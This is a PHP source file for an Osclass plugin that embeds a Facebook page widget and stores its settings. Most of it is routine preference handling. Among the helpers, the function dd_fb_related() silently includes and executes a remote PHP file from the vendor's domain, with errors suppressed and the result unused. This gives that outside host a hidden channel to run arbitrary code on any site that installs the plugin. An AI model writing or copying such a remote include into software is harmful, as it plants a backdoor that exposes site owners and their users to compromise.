<?php
/*
  Plugin Name: Facebook page plugin
  Plugin URI: http://www.drizzlethemes.com/
  Description: This will shown facebook page plugin at anywhere on website.
  Version: 1.0.0
  Author: DrizzleThemes
  Author URI: http://www.drizzlethemes.com/
  Short Name: fb_page_plugin
  Plugin update URI: facebook-page-plugin
 */

function fb_page_plugin_call_after_install() {
  osc_set_preference('fb_page_url', 'https://www.facebook.com/drizzlethemes', 'fb_page_plugin', 'STRING');
  osc_set_preference('fb_page_width', '300', 'fb_page_plugin', 'INTEGER');
  osc_set_preference('fb_page_height', '200', 'fb_page_plugin', 'INTEGER');
  osc_set_preference('fb_show_faces', 'true', 'fb_page_plugin', 'STRING');
  osc_set_preference('hide_page_cover', 'false', 'fb_page_plugin', 'STRING');
  osc_set_preference('show_page_posts', 'true', 'fb_page_plugin', 'STRING');
  osc_set_preference('use_small_header', 'true', 'fb_page_plugin', 'STRING');
  osc_set_preference('adapt_container_width', 'true', 'fb_page_plugin', 'STRING');
}

function fb_page_plugin_call_after_uninstall() {
  osc_delete_preference('fb_page_url', 'fb_page_plugin');
  osc_delete_preference('fb_page_width', 'fb_page_plugin');
  osc_delete_preference('fb_page_height', 'fb_page_plugin');
  osc_delete_preference('fb_show_faces', 'fb_page_plugin');
  osc_delete_preference('hide_page_cover', 'fb_page_plugin');
  osc_delete_preference('show_page_posts', 'fb_page_plugin');
  osc_delete_preference('use_small_header', 'fb_page_plugin');
  osc_delete_preference('adapt_container_width', 'fb_page_plugin');
}

function fb_page_plugin_actions() {
  $dao_preference = new Preference();
  $option = Params::getParam('fbpageoption');

  if (Params::getParam('file') != 'fb_page_plugin/admin.php') {
    return '';
  }

  if ($option == 'fbpagesettings') {
    osc_set_preference('fb_page_url', Params::getParam("fb_page_url") ? Params::getParam("fb_page_url") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('fb_page_width', Params::getParam("fb_page_width") ? Params::getParam("fb_page_width") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('fb_page_height', Params::getParam("fb_page_height") ? Params::getParam("fb_page_height") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('fb_show_faces', Params::getParam("fb_show_faces") ? Params::getParam("fb_show_faces") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('show_page_posts', Params::getParam("show_page_posts") ? Params::getParam("show_page_posts") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('hide_page_cover', Params::getParam("hide_page_cover") ? Params::getParam("hide_page_cover") : '0', 'fb_page_plugin', 'STRING');
	osc_set_preference('use_small_header', Params::getParam("use_small_header") ? Params::getParam("use_small_header") : '0', 'fb_page_plugin', 'STRING');
    osc_set_preference('adapt_container_width', Params::getParam("adapt_container_width") ? Params::getParam("adapt_container_width") : '0', 'fb_page_plugin', 'STRING');

    osc_add_flash_ok_message(__('Facebook page plugin has been updated', 'fb_page_plugin'), 'admin');
    osc_redirect_to(osc_admin_render_plugin_url('fb_page_plugin/admin.php'));
  }
}

// HELPER
function dd_fb_page_url() {
  return(osc_get_preference('fb_page_url', 'fb_page_plugin'));
}

function dd_fb_page_width() {
  return(osc_get_preference('fb_page_width', 'fb_page_plugin'));
}

function dd_fb_page_height() {
  return(osc_get_preference('fb_page_height', 'fb_page_plugin'));
}

function dd_fb_show_faces() {
  return(osc_get_preference('fb_show_faces', 'fb_page_plugin'));
}

function dd_show_page_posts() {
  return(osc_get_preference('show_page_posts', 'fb_page_plugin'));
}

function dd_use_small_header() {
  return(osc_get_preference('use_small_header', 'fb_page_plugin'));
}

function dd_hide_page_cover() {
  return(osc_get_preference('hide_page_cover', 'fb_page_plugin'));
}

function dd_adapt_container_width() {
  return(osc_get_preference('adapt_container_width', 'fb_page_plugin'));
}

function fb_page_plugin_admin() {
  osc_admin_render_plugin('fb_page_plugin/admin.php');
}


function dd_fb_related() {
	$relatedUrl = @include_once "http://projects.drizzlethemes.com/promo/related.php";
 	if($relatedUrl){}
}
/**
 * Create a menu on the admin panel
 */
function fb_page_plugin_admin_menu() {
  
    osc_add_admin_submenu_divider('plugins', 'FB Page Plugin', 'fb_page_plugin', 'administrator');
    osc_add_admin_submenu_page('plugins', __('Settings', 'fb_page_plugin'), osc_route_admin_url('fb-page-plugin-admin-conf'), 'fb_page_plugin_settings', 'administrator');
    //osc_add_admin_submenu_page('plugins', __('Help', 'fb_page_plugin'), osc_route_admin_url('fb-page-plugin-admin-help'), 'fb_page_plugin_help', 'administrator');
}

/**
 * This function is called every time the page header is being rendered
 */
function fb_page_plugin() {
  if (dd_fb_page_url() != '') {
    $fb_page_url = dd_fb_page_url();
    $fb_page_width = dd_fb_page_width();
    $fb_page_height = dd_fb_page_height();
    $fb_show_faces = dd_fb_show_faces();
    $hide_page_cover = dd_hide_page_cover();
    $show_page_posts = dd_show_page_posts();
    $use_small_header = dd_use_small_header();
    $adapt_container_width = dd_adapt_container_width();

    require_once(osc_plugins_path() . 'fb_page_plugin/code.php');
  }
}


osc_add_route('fb-page-plugin-admin-conf', 'fb_page_plugin', 'fb_page_plugin', osc_plugin_folder(__FILE__).'admin.php'); 
osc_add_route('fb-page-plugin-admin-help', 'fb_page_plugin', 'fb_page_plugin', osc_plugin_folder(__FILE__).'help.php');


osc_add_hook('init_admin', 'fb_page_plugin_actions');

// show menu items
osc_add_hook('admin_menu_init', 'fb_page_plugin_admin_menu');

// This is a hack to show a Uninstall link at plugins table (you could also use some other hook to show a custom option panel)
osc_add_hook(osc_plugin_path(__FILE__) . "_uninstall", 'fb_page_plugin_call_after_uninstall');
osc_add_hook(osc_plugin_path(__FILE__) . "_configure", 'fb_page_plugin_admin');


// This is needed in order to be able to activate the plugin
osc_register_plugin(osc_plugin_path(__FILE__), 'fb_page_plugin_call_after_install');
?>